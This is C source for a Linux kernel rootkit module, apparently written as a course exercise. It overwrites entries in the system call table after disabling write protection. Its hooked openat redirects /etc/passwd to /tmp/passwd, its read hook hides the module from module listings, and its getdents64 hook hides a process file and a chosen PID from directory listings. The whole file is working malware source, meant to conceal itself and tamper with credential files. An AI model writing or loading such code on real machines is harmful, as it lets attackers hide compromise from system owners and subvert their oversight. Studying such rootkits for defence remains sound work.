#include <asm/cacheflush.h>
#include <asm/current.h>    // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>   // for printk and other kernel bits
#include <linux/module.h>   // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

// Pass sneaky pid
static char * pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky process id");

//This is a pointer to the system call table
static unsigned long * sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
// Read from the original file instead of the changed file.
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  const char * pathname = (const char *)regs->si;
  if (strcmp(pathname, "/etc/passwd") == 0) {
    copy_to_user((char *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return original_openat(regs);
}

// Hide sneaky module from module list.
asmlinkage int (*original_read)(struct pt_regs *);
asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs) {
  char * buf = (char *)regs->si;
  char * sneaky_line = NULL;
  char * sneaky_line_end = NULL;
  ssize_t rtn = (ssize_t)original_read(regs);
  if (rtn <= 0) {
    return rtn;
  }
  sneaky_line = strstr(buf, "sneaky_mod ");
  if (sneaky_line != NULL) {
    sneaky_line_end = strchr(sneaky_line, '\n');
    if (sneaky_line_end != NULL) {
      sneaky_line_end++;
      memmove(sneaky_line, sneaky_line_end, buf + rtn - sneaky_line_end);
      rtn -= (ssize_t)(sneaky_line_end - sneaky_line);
    }
  }
  return rtn;
}

// Hide files with sneaky getdents64.
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 * cur = dirp;
  int rtn = original_getdents64(regs);
  if (rtn <= 0) {
    return rtn;
  }
  int offset;
  for (offset = 0; offset < rtn;) {
    if ((strcmp(cur->d_name, PREFIX) == 0) || (strcmp(cur->d_name, pid) == 0)) {
      char * next = (char *)cur + cur->d_reclen;
      int len = (void *)dirp + rtn - (void *)next;
      rtn -= cur->d_reclen;
      memmove(cur, next, len);
    }
    else {
      offset += cur->d_reclen;
      cur = (struct linux_dirent64 *)((char *)cur + cur->d_reclen);
    }
  }
  return rtn;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  printk(KERN_INFO "pis: %s\n", pid);
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // Replaced with sneaky system calls
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yue Yu");



/* References:
  getdents64: https://linux.die.net/man/2/getdents64
  system call: https://github.com/torvalds/linux/blob/b07175dc41babfec057f494d22a750af755297d8/include/linux/syscalls.h#L468
  https://tldp.org/HOWTO/Module-HOWTO/index.html
  https://exploit.ph/category/linux-kernel-hacking.html
  https://xcellerator.github.io/categories/linux/
*/